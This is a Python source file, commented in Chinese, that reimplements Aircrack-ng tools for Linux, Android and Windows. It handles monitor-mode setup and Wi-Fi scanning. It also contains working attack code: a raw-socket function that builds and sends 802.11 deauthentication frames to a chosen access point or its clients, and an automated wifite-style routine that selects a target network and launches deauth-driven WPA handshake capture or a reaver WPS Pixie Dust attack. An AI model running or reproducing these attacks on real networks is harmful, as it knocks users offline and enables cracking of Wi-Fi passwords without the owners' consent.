"""
WNAD - Aircrack-ng 套件纯 Python 重实现
包含: airmon-ng / airodump-ng / aireplay-ng / wifite
全部纯 Python，电脑手机都能跑
"""

import os
import re
import sys
import time
import json
import socket
import struct
import signal
import random
import hashlib
import threading
import subprocess
from datetime import datetime
from core.utils import C, CHECK, CROSS, INFO, WARN, ROOT, ARROW, print_table
from core.root_check import is_root, require_root_graceful


# ═══════════════════════════════════════════════
#  辅助函数
# ═══════════════════════════════════════════════

def _run_cmd(cmd: list, timeout: int = 10, text: bool = True) -> tuple:
    """运行系统命令"""
    try:
        r = subprocess.run(cmd, capture_output=True, text=text, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        return -1, "", "命令不存在"
    except subprocess.TimeoutExpired:
        return -1, "", "超时"
    except Exception as e:
        return -1, "", str(e)


def _get_wifi_ifaces() -> list:
    """获取所有 WiFi 接口"""
    ifaces = []
    sys_net = "/sys/class/net"
    if os.path.isdir(sys_net):
        for name in sorted(os.listdir(sys_net)):
            type_path = f"{sys_net}/{name}/type"
            if os.path.isfile(type_path):
                try:
                    with open(type_path) as f:
                        if int(f.read().strip()) == 772:
                            ifaces.append(name)
                except Exception:
                    pass
    # 备用: iwconfig
    if not ifaces:
        rc, out, _ = _run_cmd(["iwconfig"])
        if rc == 0:
            for line in out.split("\n"):
                m = re.match(r'^(\S+)\s+', line)
                if m and m.group(1) not in ("lo",) and m.group(1) not in ifaces:
                    ifaces.append(m.group(1))
    return ifaces


def _get_iface_mode(iface: str) -> str:
    """获取接口模式 (Managed/Monitor/Master)"""
    rc, out, _ = _run_cmd(["iwconfig", iface])
    if rc == 0:
        m = re.search(r'Mode:(\S+)', out)
        if m:
            return m.group(1)
    rc, out, _ = _run_cmd(["iw", iface, "info"])
    if rc == 0:
        if "type monitor" in out:
            return "Monitor"
        m = re.search(r'type (\S+)', out)
        if m:
            return m.group(1).capitalize()
    return "Unknown"


def _get_iface_driver(iface: str) -> str:
    """获取接口驱动"""
    # sysfs
    dev_path = f"/sys/class/net/{iface}/device/driver"
    if os.path.islink(dev_path):
        try:
            return os.path.basename(os.readlink(dev_path))
        except Exception:
            pass
    # ethtool
    rc, out, _ = _run_cmd(["ethtool", "-i", iface])
    if rc == 0:
        m = re.search(r'driver:\s*(\S+)', out)
        if m:
            return m.group(1)
    return ""


def _get_iface_chipset(iface: str) -> str:
    """获取接口芯片组"""
    dev_path = f"/sys/class/net/{iface}/device"
    if os.path.isdir(dev_path):
        uevent = f"{dev_path}/uevent"
        if os.path.isfile(uevent):
            try:
                with open(uevent) as f:
                    for line in f:
                        if line.startswith("DRIVER="):
                            return line.strip().split("=", 1)[1]
            except Exception:
                pass
    return ""


def _get_phy_from_iface(iface: str) -> str:
    """从接口名获取 phy 编号（如 phy0）"""
    try:
        real = os.path.realpath(f"/sys/class/net/{iface}/phy80211")
        return os.path.basename(real)
    except Exception:
        return ""


def _sig_bars(dbm: int) -> str:
    """dBm 转信号条"""
    if dbm >= 0:
        dbm = -100
    pct = max(0, min(100, int((dbm + 100) * 1.5)))
    filled = pct // 10
    return "█" * filled + "░" * (10 - filled)


# ═══════════════════════════════════════════════
#  1. airmon-ng  — 监控模式管理
# ═══════════════════════════════════════════════

def _list_interfering_processes() -> list:
    """列出干扰监控模式的进程（类 airmon-ng check）"""
    procs = []
    killers = ["NetworkManager", "wpa_supplicant", "dhclient", "dhcpcd",
               "avahi-daemon", "dnsmasq", "hostapd", "iwd", "connman"]
    try:
        rc, out, _ = _run_cmd(["ps", "-A"], timeout=5)
        if rc == 0:
            for line in out.split("\n"):
                for k in killers:
                    if k.lower() in line.lower() and k not in [p[0] for p in procs]:
                        parts = line.strip().split()
                        if parts:
                            pid = parts[0] if parts[0].isdigit() else (parts[1] if len(parts) > 1 and parts[1].isdigit() else "")
                            procs.append((k, pid))
    except Exception:
        pass
    return procs


def airmon_check():
    """airmon-ng 检查: 列出接口 + 干扰进程（非 root 可用）"""
    print(f" {C.BOLD}PHY\t接口\t\t驱动\t\t芯片组\t\t模式{C.NC}")
    print(f" {C.DIM}{'─'*72}{C.NC}")

    ifaces = _get_wifi_ifaces()
    phy_map = {}
    for iface in ifaces:
        phy = _get_phy_from_iface(iface)
        phy = phy if phy else "?"
        driver = _get_iface_driver(iface) or "?"
        chipset = _get_iface_chipset(iface) or "?"
        mode = _get_iface_mode(iface)
        phy_map[iface] = (phy, driver, chipset, mode)
        phy_disp = phy.replace("phy", "")
        print(f"  {C.CYAN}{phy_disp:<4}{C.NC}{iface:<16}{driver:<16}{chipset:<16}{mode}")

    if not ifaces:
        print(f"  {C.DIM}(未检测到 WiFi 接口){C.NC}")

    # 非 root 也显示干扰进程
    print(f"\n {C.BOLD}干扰进程 (class airmon-ng check):{C.NC}")
    procs = _list_interfering_processes()
    if procs:
        for name, pid in procs:
            print(f"  {C.RED}✗{C.NC} PID:{pid:<8}{name}")
        print(f"\n {INFO} 需关闭干扰进程后才能开启监控模式")
        print(f"     {C.YELLOW}kill <PID>{C.NC} 或 {C.YELLOW}systemctl stop <服务>{C.NC}")
    else:
        print(f"  {C.DIM}(未发现已知干扰进程){C.NC}")


def airmon_start(iface: str = None):
    """开启监控模式（类 airmon-ng start <iface>）"""
    root = require_root_graceful("开启监控模式", "退化为接口查询模式")
    if root is not True and root is not False:
        return  # 用户取消

    if not iface:
        ifaces = _get_wifi_ifaces()
        if not ifaces:
            print(f" {CROSS} 未检测到 WiFi 接口")
            return
        iface = ifaces[0]
        print(f" {INFO} 自动选择: {C.CYAN}{iface}{C.NC}")

    if root is False:
        print(f" {INFO} 非 root 模式，无法开启真实监控模式")
        print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
        print(f" {INFO} 当前模式: {C.CYAN}{_get_iface_mode(iface)}{C.NC}")
        return

    # kill 干扰进程
    procs = _list_interfering_processes()
    if procs:
        print(f"\n {ROOT} 关闭 {len(procs)} 个干扰进程...")
        for name, pid in procs:
            if pid:
                _run_cmd(["kill", pid], timeout=3)
                print(f"  {C.RED}•{C.NC} killed {name} (PID {pid})")

    print(f"\n {ROOT} 开启 {C.CYAN}{iface}{C.NC} 监控模式...\n")

    # 先 down
    _run_cmd(["ip", "link", "set", iface, "down"], timeout=5)

    # iw set monitor
    rc, _, err = _run_cmd(["iw", iface, "set", "monitor", "control"], timeout=5)
    if rc == 0:
        print(f" {CHECK} 监控模式已开启 (iw)")
    else:
        print(f" {WARN} iw 失败: {err}")
        rc2, _, err2 = _run_cmd(["iwconfig", iface, "mode", "monitor"], timeout=5)
        if rc2 == 0:
            print(f" {CHECK} 监控模式已开启 (iwconfig)")
        else:
            print(f" {CROSS} 开启失败: {err2}")
            _run_cmd(["ip", "link", "set", iface, "up"], timeout=3)
            return

    # up
    _run_cmd(["ip", "link", "set", iface, "up"], timeout=3)
    time.sleep(1)

    mode = _get_iface_mode(iface)
    print(f" {CHECK} 当前模式: {C.CYAN}{mode}{C.NC}")

    # 列出新接口（airmon-ng 风格: <old_iface> -> <new_iface>）
    new_ifaces = _get_wifi_ifaces()
    new_name = iface
    for ni in new_ifaces:
        if ni.startswith(f"{iface}mon") or ni.startswith(f"mon{iface}"):
            new_name = ni
            break

    if new_name != iface:
        print(f"\n {C.BOLD}({iface} 已重命名为 {C.CYAN}{new_name}{C.NC}){C.NC}")
    else:
        print(f"\n {C.BOLD}(接口名不变: {iface}){C.NC}")

    print(f" {INFO} 使用 {C.CYAN}wnad air --dump -i {new_name}{C.NC} 开始抓包")


def airmon_stop(iface: str = None):
    """关闭监控模式（类 airmon-ng stop <iface>）"""
    root = require_root_graceful("关闭监控模式", "无需操作")
    if root is not True:
        return

    if not iface:
        ifaces = _get_wifi_ifaces()
        if not ifaces:
            print(f" {CROSS} 未检测到 WiFi 接口")
            return
        # 找 monitor 模式的
        mon_ifaces = [i for i in ifaces if "Monitor" in _get_iface_mode(i)]
        if mon_ifaces:
            iface = mon_ifaces[0]
        else:
            iface = ifaces[0]

    print(f" {ROOT} 关闭 {C.CYAN}{iface}{C.NC} 监控模式...\n")
    _run_cmd(["ip", "link", "set", iface, "down"], timeout=3)
    rc, _, err = _run_cmd(["iw", iface, "set", "type", "managed"], timeout=5)
    if rc == 0:
        print(f" {CHECK} 已恢复为 Managed 模式 (iw)")
    else:
        _run_cmd(["iwconfig", iface, "mode", "managed"], timeout=5)
        print(f" {CHECK} 已恢复为 Managed 模式 (iwconfig)")
    _run_cmd(["ip", "link", "set", iface, "up"], timeout=3)
    print(f" {CHECK} 接口 {iface} 已恢复正常模式")


# ═══════════════════════════════════════════════
#  2. airodump-ng  — 实时抓包+AP/客户端显示
# ═══════════════════════════════════════════════

def _scan_aps_airodump(iface: str, channel: str = None) -> tuple:
    """底层 WiFi 扫描，返回 (aps_list, clients_list)"""
    aps = []
    clients = {}
    from core.utils import is_windows

    if is_windows():
        try:
            r = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True, timeout=20,
                encoding="utf-8", errors="replace"
            )
            if r.returncode == 0:
                cur = {}
                for line in r.stdout.split("\n"):
                    s = re.search(r'^SSID\s+\d+\s*:\s*(.+)', line)
                    if s:
                        if cur:
                            aps.append(cur)
                        cur = {"bssid": "?", "ssid": s.group(1).strip(),
                               "signal": -100, "channel": "?", "enc": "?",
                               "beacons": 0, "data": 0, "clients": []}
                    b = re.search(r'BSSID\s*\d+\s*:\s*([0-9a-fA-F:\-]{17})', line)
                    if b and cur:
                        cur["bssid"] = b.group(1).replace("-", ":").upper()
                    p = re.search(r'(?:信号|Signal)\s*:\s*(-?\d+)%', line)
                    if p and cur:
                        cur["signal"] = int((int(p.group(1)) / 1.5) - 100)
                    c = re.search(r'(?:信道|Channel)\s*:\s*(\d+)', line)
                    if c and cur:
                        cur["channel"] = c.group(1)
                    e = re.search(r'(?:身份验证|Authentication)\s*:\s*(\S+)', line)
                    if e and cur:
                        a = e.group(1).upper()
                        cur["enc"] = "OPEN" if a == "OPEN" else "WPA3" if "WPA3" in a else "WPA2" if "WPA2" in a else a
                if cur:
                    aps.append(cur)
        except Exception:
            pass
    else:
        # Linux/Android: iw dev scan
        try:
            rc, out, _ = _run_cmd(["iw", "dev", iface, "scan"], timeout=15)
            if rc != 0 or not out:
                rc, out, _ = _run_cmd(["iwlist", iface, "scan"], timeout=15)
            if rc == 0 and out:
                cur = {}
                for line in out.split("\n"):
                    b = re.search(r'BSS\s+([0-9a-fA-F:]{17})', line)
                    b2 = re.search(r'Cell\s+\d+.*Address:\s*([0-9a-fA-F:]{17})', line)
                    if b or b2:
                        if cur:
                            aps.append(cur)
                        mac = (b or b2).group(1).upper()
                        cur = {"bssid": mac, "ssid": "?", "signal": -100,
                               "channel": "?", "enc": "?", "beacons": 0,
                               "data": 0, "clients": []}
                    s = re.search(r'SSID:\s*(.*)', line)
                    if s and cur:
                        cur["ssid"] = s.group(1).strip() or "(hidden)"
                    s2 = re.search(r'ESSID:"(.*)"', line)
                    if s2 and cur:
                        cur["ssid"] = s2.group(1) or "(hidden)"
                    p = re.search(r'signal:\s*(-?\d+)', line)
                    if p and cur:
                        cur["signal"] = int(p.group(1))
                    f = re.search(r'freq:\s*(\d+)', line)
                    if f and cur:
                        fv = int(f.group(1))
                        cur["channel"] = str((fv-2412)//5+1) if 2412 <= fv <= 2484 else \
                                         str((fv-5180)//5+36) if 5170 <= fv <= 5825 else f"{fv}MHz"
                    c = re.search(r'Channel\s*(\d+)', line)
                    if c and cur:
                        cur["channel"] = c.group(1)
                    if "Group cipher" in line and cur:
                        cur["enc"] = "WPA3" if "SAE" in line else ("WPA2" if "CCMP" in line else "WEP")
                    if "RSN:" in line and cur and cur["enc"] == "?":
                        cur["enc"] = "WPA2"
                    e = re.search(r'Encryption key:(\S+)', line)
                    if e and cur:
                        cur["enc"] = "OPEN" if "off" in e.group(1).lower() else "WPA2"
                if cur:
                    aps.append(cur)
        except Exception:
            pass

    return aps, clients


def airodump_start(iface: str = None, channel: str = None,
                   output: str = None, write_interval: int = 5,
                   channel_hop: bool = True):
    """
    airodump-ng 风格实时抓包
    持续扫描，显示 AP 和客户端，可选文件输出
    """
    from core.utils import is_windows

    if not iface:
        ifaces = _get_wifi_ifaces()
        if not ifaces:
            if is_windows():
                iface = "WLAN"  # Windows 用 netsh
            else:
                print(f" {CROSS} 未检测到 WiFi 接口")
                return
        else:
            iface = ifaces[0]

    if output:
        output = os.path.abspath(output)
        output_dir = os.path.dirname(output) or "."
        os.makedirs(output_dir, exist_ok=True)

    print(f" {C.BOLD}airodump-ng{C.NC} (接口: {C.CYAN}{iface}{C.NC})")
    if channel:
        print(f" {INFO} 锁定信道: {channel}")
    else:
        print(f" {INFO} 频道跳频中 (按数字键锁定信道)")
    print(f" {INFO} 按 {C.YELLOW}Ctrl+C{C.NC} 停止")
    if output:
        print(f" {INFO} 输出到: {C.CYAN}{output}.csv/.cap{C.NC}")
    print()

    seen_aps = {}
    seen_clients = {}
    last_write = 0
    hop_channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
    hop_idx = 0
    loop_count = 0

    try:
        while True:
            aps, _ = _scan_aps_airodump(iface, channel)
            now = time.time()
            loop_count += 1

            # 合并 AP 数据
            for ap in aps:
                bssid = ap["bssid"]
                if bssid in seen_aps:
                    seen_aps[bssid]["signal"] = ap["signal"]
                    seen_aps[bssid]["channel"] = ap["channel"]
                    seen_aps[bssid]["enc"] = ap["enc"]
                    seen_aps[bssid]["beacons"] += 1
                    seen_aps[bssid]["last_seen"] = now
                else:
                    ap["first_seen"] = now
                    ap["last_seen"] = now
                    ap["beacons"] = 1
                    seen_aps[bssid] = ap

            # 清理 120 秒未出现的
            stale = [b for b, a in seen_aps.items() if now - a["last_seen"] > 120]
            for b in stale:
                del seen_aps[b]

            # 渲染
            sys.stdout.write("\033[H\033[J")
            print(f" {C.BOLD}{'BSSID':<19}{'PWR':<8}{'Beacons':<10}{'#Data':<8}{'CH':<5}{'ENC':<10}{'CIPHER':<10}{'AUTH':<8}{'ESSID'}{C.NC}")
            print(f" {C.DIM}{'─'*100}{C.NC}")

            sorted_aps = sorted(seen_aps.values(), key=lambda x: x.get("signal", -100), reverse=True)
            for ap in sorted_aps[:25]:
                bssid = ap["bssid"]
                pwr = ap.get("signal", -100)
                beacons = ap.get("beacons", 0)
                data = ap.get("data", 0)
                ch = ap.get("channel", "?")
                enc = ap.get("enc", "?")
                cipher = ""
                auth = "PSK" if enc in ("WPA2", "WPA3") else ""
                ssid = ap.get("ssid", "?")[:28]

                pwr_color = C.GREEN if pwr > -60 else (C.YELLOW if pwr > -80 else C.DIM)
                enc_color = C.GREEN if enc == "OPEN" else (C.RED if enc in ("WPA2", "WPA3") else C.YELLOW)

                print(f"  {bssid:<19}{pwr_color}{pwr:>4}{C.NC}   {beacons:<8}{data:<8}{ch:<5}{enc_color}{enc:<10}{C.NC}{cipher:<10}{auth:<8}{ssid}")

            # 客户端（简化）
            print(f"\n {C.BOLD}{'BSSID':<19}{'STATION':<19}{'PWR':<8}{'Rate':<10}{'Lost':<8}{'Probes'}{C.NC}")
            print(f" {C.DIM}{'─'*80}{C.NC}")
            print(f"  {C.DIM}(客户端数据仅在 root 监控模式下可用){C.NC}")

            # 状态行
            ap_count = len(seen_aps)
            ch_info = channel if channel else f"hop ({hop_channels[hop_idx % len(hop_channels)]})"
            elapsed = int(now - (list(seen_aps.values())[0]["first_seen"] if seen_aps else now))
            print(f"\n {C.DIM}[{datetime.now().strftime('%H:%M:%S')}] "
                  f"APs: {ap_count}  |  Ch: {ch_info}  |  Elapsed: {elapsed}s  |  "
                  f"Ctrl+C to stop{C.NC}")

            sys.stdout.flush()

            # 写入文件
            if output and (now - last_write > write_interval):
                last_write = now
                _write_airodump_output(output, seen_aps, seen_clients)

            time.sleep(2)

    except KeyboardInterrupt:
        print(f"\n\n {CHECK} 已停止")
        if output:
            _write_airodump_output(output, seen_aps, seen_clients)
            print(f" {CHECK} 数据已保存到: {C.CYAN}{output}.csv{C.NC}")
        print(f" {CHECK} 共计发现 AP: {len(seen_aps)}")


def _write_airodump_output(prefix: str, aps: dict, clients: dict):
    """写入 airodump-ng 风格的 CSV 文件"""
    csv_path = f"{prefix}.csv"
    try:
        with open(csv_path, "w", encoding="utf-8") as f:
            f.write("BSSID,FirstSeen,LastSeen,Channel,Speed,Privacy,Cipher,"
                    "Authentication,Power,Beacons,ESSID\n")
            now = datetime.now().isoformat()
            for ap in aps.values():
                bssid = ap.get("bssid", "")
                fs = datetime.fromtimestamp(ap.get("first_seen", 0)).isoformat()
                ls = datetime.fromtimestamp(ap.get("last_seen", 0)).isoformat()
                ch = ap.get("channel", "")
                enc = ap.get("enc", "")
                pwr = ap.get("signal", 0)
                beacons = ap.get("beacons", 0)
                ssid = ap.get("ssid", "").replace(",", "_")
                f.write(f"{bssid},{fs},{ls},{ch},-1,{enc},,{pwr},\"{beacons}\",\"{ssid}\"\n")
    except Exception:
        pass


# ═══════════════════════════════════════════════
#  3. aireplay-ng  — 数据包注入
# ═══════════════════════════════════════════════

def aireplay_deauth(target_bssid: str, iface: str = None,
                    count: int = 5, client_bssid: str = None):
    """Deauth 攻击（类 aireplay-ng -0）"""
    root = require_root_graceful("Deauth 攻击", "无非 root 替代方案")
    if root is not True:
        return

    if not target_bssid:
        print(f" {CROSS} 请指定目标 BSSID")
        print(f" {INFO} 使用 {C.CYAN}wnad air --dump{C.NC} 查找 BSSID")
        return

    if not iface:
        ifaces = _get_wifi_ifaces()
        if not ifaces:
            print(f" {CROSS} 未检测到 WiFi 接口")
            return
        iface = ifaces[0]

    print(f"\n {ROOT} {C.RED}Deauth Attack{C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_bssid}{C.NC}")
    print(f" {INFO} 客户端: {C.CYAN}{client_bssid or 'broadcast (all)'}{C.NC}")
    print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
    print(f" {INFO} 轮次: {count} 轮\n")

    # 优先调用系统 aireplay-ng
    rc, _, _ = _run_cmd(["which", "aireplay-ng"])
    if rc == 0:
        try:
            for i in range(count):
                print(f" {INFO} 第 {i+1}/{count} 轮...")
                cmd = ["aireplay-ng", "-0", "1", "-a", target_bssid, iface]
                if client_bssid:
                    cmd = ["aireplay-ng", "-0", "1", "-a", target_bssid, "-c", client_bssid, iface]
                subprocess.run(cmd, capture_output=True, timeout=30)
                time.sleep(1)
        except KeyboardInterrupt:
            print(f" {INFO} 用户中断")
        print(f" {CHECK} Deauth 攻击完成")
        return

    # 纯 Python 实现（需要 root + raw socket）
    try:
        _raw_deauth(target_bssid, iface, count, client_bssid)
    except Exception as e:
        print(f" {CROSS} 纯 Python 实现失败: {e}")
        print(f" {INFO} 建议安装: {C.YELLOW}pkg install aircrack-ng{C.NC}")


def _raw_deauth(target_bssid: str, iface: str, count: int, client: str = None):
    """纯 Python raw socket Deauth 实现"""
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((iface, 0))
    except Exception:
        print(f" {CROSS} 需要 root + raw socket (Linux only)")
        return

    # 802.11 Deauth 帧
    bssid = target_bssid.replace(":", "").lower()
    src = bssid
    bssid_bytes = bytes.fromhex(bssid)
    dest_bytes = bytes.fromhex(client.replace(":", "").lower() if client else "ffffffffffff")
    src_bytes = bytes.fromhex(src)

    # 帧控制: 0xC0 = Deauth
    frame = bytes.fromhex("c000") + \
            struct.pack("!H", 0) + \
            dest_bytes + src_bytes + bssid_bytes + \
            struct.pack("!H", 0) + \
            bytes.fromhex("0700")

    for i in range(count):
        try:
            s.send(frame)
            print(f" {CHECK} Deauth 包 #{i+1} 已发送 ({target_bssid[:8]}...)")
            time.sleep(0.5)
        except Exception as e:
            print(f" {CROSS} 发送失败: {e}")
    s.close()
    print(f"\n {CHECK} 共发送 {count} 个 Deauth 包")


# ═══════════════════════════════════════════════
#  4. wifite  — 自动化 WiFi 审计
# ═══════════════════════════════════════════════

def wifite_run(iface: str = None):
    """
    自动化 WiFi 审计 (类 wifite)
    步骤: 扫描 → 选择目标 → 自动攻击 (WPA 握手捕获 / WPS Pixie)
    """
    from core.utils import is_windows

    print(f"\n {C.BOLD}{C.GREEN}■■■■  Wifite  -  Automated WiFi Auditor  ■■■■{C.NC}\n")

    if not iface:
        ifaces = _get_wifi_ifaces()
        if is_windows():
            iface = "WLAN"
            print(f" {INFO} Windows 检测中...\n")
            _wifite_windows_scan()
            return
        elif not ifaces:
            print(f" {CROSS} 未检测到 WiFi 接口")
            print(f" {INFO} 插上 USB 网卡后重试")
            return
        iface = ifaces[0]

    print(f" {INFO} 接口: {C.CYAN}{iface}{C.NC}")
    print(f" {INFO} 模式: {C.CYAN}{_get_iface_mode(iface)}{C.NC}")
    print(f" {INFO} 正在扫描... (约 5-10 秒)\n")

    # 步骤 1: 扫描
    aps, clients = _scan_aps_airodump(iface)
    if not aps:
        print(f" {CROSS} 未发现任何 AP")
        return

    # 显示 AP
    print(f" {CHECK} 发现 {len(aps)} 个 AP:\n")
    rows = []
    for i, ap in enumerate(aps[:30]):
        ssid = ap.get("ssid", "?").strip()
        bssid = ap.get("bssid", "?")
        pwr = ap.get("signal", -100)
        ch = ap.get("channel", "?")
        enc = ap.get("enc", "?")
        enc_color = C.GREEN if enc == "OPEN" else (C.RED if enc in ("WPA2", "WPA3") else C.YELLOW)
        pwr_bar = "█" * max(1, (pwr + 100) // 10) + "░" * (10 - max(1, (pwr + 100) // 10))
        pwr_bar = pwr_bar[:10]
        rows.append([
            str(i + 1),
            f"{pwr:>3}{C.NC}dBm",
            pwr_bar,
            ch,
            f"{enc_color}{enc}{C.NC}",
            ssid[:25],
            bssid,
        ])

    print_table(["#", "PWR", "Signal", "CH", "Enc", "ESSID", "BSSID"], rows)

    # 步骤 2: 选择目标
    print(f"\n {ARROW} 选择目标 AP (1-{len(aps)})")
    try:
        choice = input(f" {C.CYAN}[?]{C.NC} 请输入序号 (0=取消): ").strip()
        if not choice or choice == "0":
            print(f" {INFO} 已取消")
            return
        idx = int(choice) - 1
        if idx < 0 or idx >= len(aps):
            print(f" {CROSS} 无效选择")
            return
    except (ValueError, EOFError, KeyboardInterrupt):
        print(f"\n {INFO} 已取消")
        return

    target = aps[idx]
    target_ssid = target.get("ssid", "?")
    target_bssid = target.get("bssid", "?")
    target_ch = target.get("channel", "1")
    target_enc = target.get("enc", "?")

    print(f"\n {CHECK} 已选择: {C.CYAN}{target_ssid}{C.NC}")
    print(f"     BSSID: {target_bssid}")
    print(f"     信道:   {target_ch}")
    print(f"     加密:   {target_enc}")

    # 步骤 3: 选择攻击方式
    if target_enc == "WPA3":
        attacks = ["evil_twin"]
    elif target_enc == "WPA2" or target_enc == "WPA":
        attacks = ["handshake", "pixie"]
    elif target_enc == "OPEN":
        attacks = ["connect"]
    else:
        attacks = ["handshake"]

    print(f"\n {C.BOLD}可用攻击:{C.NC}")
    for i, a in enumerate(attacks):
        desc = {
            "handshake": "WPA 四次握手捕获 + Deauth (需要 root)",
            "pixie": "WPS Pixie Dust 攻击 (需要 root + wps)",
            "evil_twin": "Evil Twin 攻击 (需要 root + hostapd)",
            "connect": "尝试连接 (无密码)",
        }.get(a, a)
        print(f"  {C.YELLOW}{i+1}.{C.NC} {a.upper():<15} {C.DIM}{desc}{C.NC}")

    if len(attacks) == 1:
        attack = attacks[0]
        print(f"\n {INFO} 自动选择: {attack}")
    else:
        try:
            a_choice = input(f"\n {C.CYAN}[?]{C.NC} 选择攻击方式 (1-{len(attacks)}): ").strip()
            attack = attacks[int(a_choice) - 1]
        except (ValueError, IndexError, EOFError):
            print(f" {CROSS} 无效选择")
            return

    # 执行攻击
    print(f"\n {ROOT} 执行 {C.RED}{attack.upper()}{C.NC} 攻击...\n")

    if attack == "handshake":
        # 先开 Deauth 踢客户端，同时监听握手
        print(f" {INFO} 步骤1: Deauth 攻击以触发客户端重连...")
        if is_root():
            airmon_start(iface)
            # 锁定信道
            _run_cmd(["iw", iface, "set", "channel", target_ch], timeout=3)
            # 启动抓包 + Deauth
            output_file = f"handshake_{target_bssid.replace(':', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            print(f" {INFO} 步骤2: 监听握手包...")
            print(f" {WARN} 请在其他终端用 C 命令运行:")
            print(f"     {C.YELLOW}airodump-ng -c {target_ch} --bssid {target_bssid} -w {output_file} {iface}{C.NC}")
            print(f"     {C.YELLOW}aireplay-ng -0 5 -a {target_bssid} {iface}{C.NC}")
            print(f"\n {INFO} 等待客户端连接时 WPA 握手将被 airodump-ng 捕获")
        else:
            print(f" {CROSS} 需要 root 权限执行此攻击")
            print(f" {INFO} 请在 root 环境下: {C.YELLOW}wnad wifite{C.NC}")

    elif attack == "pixie":
        # WPS Pixie 攻击
        print(f" {INFO} 启动 WPS Pixie Dust 攻击...")
        rc, _, _ = _run_cmd(["which", "reaver"])
        if rc == 0:
            print(f" {INFO} 锁定信道 {target_ch}...")
            _run_cmd(["iw", iface, "set", "channel", target_ch], timeout=3)
            _run_cmd(["iwconfig", iface, "channel", target_ch], timeout=3)
            print(f" {INFO} 启动 reaver...")
            cmd = ["reaver", "-i", iface, "-b", target_bssid, "-c", target_ch, "-vvv", "-K"]
            print(f" {INFO} 运行: {' '.join(cmd)}")
            print(f" {WARN} 攻击进行中，按 Ctrl+C 停止...\n")
            try:
                subprocess.run(cmd)
            except KeyboardInterrupt:
                print(f"\n {INFO} 用户中断")
        else:
            print(f" {CROSS} 需要安装 reaver")
            print(f" {INFO} 安装: {C.YELLOW}pkg install reaver{C.NC}")
            print(f"   或: {C.YELLOW}sudo apt install reaver{C.NC}")

    elif attack == "evil_twin":
        print(f" {INFO} Evil Twin 攻击需要 hostapd + dnsmasq")
        print(f" {INFO} 此功能尚未集成")

    elif attack == "connect":
        print(f" {INFO} 目标无密码，尝试连接...")
        # 简化: 无法在 Termux 中自动连接 WiFi
        print(f" {WARN} 终端无法自动连接 WiFi，请在系统设置中手动连接")

    print(f"\n {CHECK} Wifite 扫描完成")


def _wifite_windows_scan():
    """Windows 上的 wifite 模式"""
    print(f" {INFO} Windows 模式: netsh 扫描 WiFi\n")
    aps, _ = _scan_aps_airodump("WLAN")
    if not aps:
        print(f" {INFO} 未发现 WiFi 网络")
        return

    print(f" {CHECK} 发现 {len(aps)} 个 WiFi 网络:\n")
    rows = []
    for i, ap in enumerate(aps[:20]):
        ssid = ap.get("ssid", "?")
        bssid = ap.get("bssid", "?")
        pwr = ap.get("signal", -100)
        ch = ap.get("channel", "?")
        enc = ap.get("enc", "?")
        enc_color = C.GREEN if enc == "OPEN" else (C.RED if enc in ("WPA2", "WPA3") else C.YELLOW)
        rows.append([str(i + 1), f"{pwr}dBm", ch, f"{enc_color}{enc}{C.NC}", ssid[:30], bssid])
    print_table(["#", "PWR", "CH", "Enc", "ESSID", "BSSID"], rows)
    print(f"\n {INFO} Windows 上攻击功能不可用（需要 Linux 或 Android root）")
    print(f" {INFO} 连接 Android 平板后可使用 {C.CYAN}wnad wifite{C.NC} 查看完整功能")


# ═══════════════════════════════════════════════
#  主分发
# ═══════════════════════════════════════════════

def air_main(args):
    """air 命令主分发"""
    if hasattr(args, 'air_check') and args.air_check:
        airmon_check()
    elif hasattr(args, 'air_start') and args.air_start is not None:
        airmon_start(args.air_start if args.air_start else None)
    elif hasattr(args, 'air_stop') and args.air_stop is not None:
        airmon_stop(args.air_stop if args.air_stop else None)
    elif hasattr(args, 'air_dump') and args.air_dump:
        airodump_start(
            iface=args.air_iface,
            channel=args.air_channel,
            output=args.air_output,
        )
    elif hasattr(args, 'air_deauth') and args.air_deauth:
        aireplay_deauth(
            target_bssid=args.air_deauth,
            iface=args.air_iface,
            count=args.air_count,
            client_bssid=args.air_client,
        )
    else:
        # 默认显示 airmon-ng check
        airmon_check()


def wifite_main(args):
    """wifite 命令主分发"""
    wifite_run(
        iface=getattr(args, 'iface', None) or getattr(args, 'air_iface', None)
    )
